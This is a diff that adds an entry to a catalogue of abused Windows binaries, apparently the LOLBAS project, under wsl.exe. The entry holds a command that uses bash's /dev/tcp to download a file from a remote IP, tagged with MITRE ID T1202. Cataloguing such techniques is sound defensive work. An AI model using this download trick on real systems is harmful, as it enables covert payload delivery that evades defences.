@@ -28,6 +28,14 @@ Commands:
     MitreID: T1202
     MitreLink: https://attack.mitre.org/techniques/T1202
     OperatingSystem: Windows 10, Windows 19 Server
+  - Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+    Description: Downloads file from 192.168.1.10
+    Usecase: Download file
+    Category: Download
+    Privileges: User
+    MitreID: T1202
+    MitreLink: https://attack.mitre.org/techniques/T1202
+    OperatingSystem: Windows 10, Windows 19 Server
 Full_Path:
   - Path: C:\Windows\System32\wsl.exe
 Code_Sample:
